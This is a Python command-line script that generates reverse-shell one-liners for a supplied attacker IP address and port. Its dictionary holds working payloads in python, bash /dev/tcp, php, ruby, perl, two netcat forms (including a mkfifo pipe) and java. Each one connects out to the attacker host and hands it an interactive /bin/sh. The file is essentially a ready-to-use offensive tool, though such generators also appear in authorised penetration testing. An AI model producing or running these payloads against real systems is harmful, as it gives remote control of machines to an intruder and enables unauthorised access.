#!/usr/bin/env python3

import argparse
from colorama import init, Fore
init()

parser = argparse.ArgumentParser(description="Example: python3 rev-shell.py -s bash --ip 10.0.2.15 -p 1234")
parser.add_argument("-s","--shell", dest="shell_type",help="the type/language you want the reverse shell to be written in [php,bash,python,perl,ruby,java,netcat\n")
parser.add_argument("--ip", dest="ip_addr",help="The attacker machine's IP address\n")
parser.add_argument("-p","--port",dest="port",help="The port on which the attacker machine is litening\n")
parsed_args = parser.parse_args()

langs = ['python', 'bash', 'php', 'ruby', 'perl', 'netcat', 'java']

def get_shell(language, ip, port):
    shells = {
        "python" : """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
        "bash" : "bash -i >& /dev/tcp/{}/{} 0>&1",
        "php" : """php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "ruby" : """ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
        "perl" : """perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
        "netcat" : "nc -e /bin/sh {} {}",
        "netcat2" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
        "java" : """r = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String)
        p.waitFor() """
    }
    return shells[language].format(ip,port)

try:
    language = parsed_args.shell_type
    ip = parsed_args.ip_addr
    port = parsed_args.port
    shell = get_shell(language,ip,port)

    if ip and port and language:
        if language == "netcat":
            print(Fore.GREEN + "[*] " + Fore.WHITE + shell)
            print(Fore.YELLOW + "OR " + Fore.WHITE)
            print(Fore.GREEN + "[*] " + Fore.WHITE + get_shell('netcat2',ip,port))
        else:
            print(Fore.GREEN + "[*] " + Fore.WHITE + shell)
    else:
        print(Fore.RED + "[!] " + Fore.WHITE + parser.description)
except KeyError: 
    print(Fore.CYAN + "Supported Languages: " + Fore.WHITE)
    for lang in langs:
        print("- " + lang)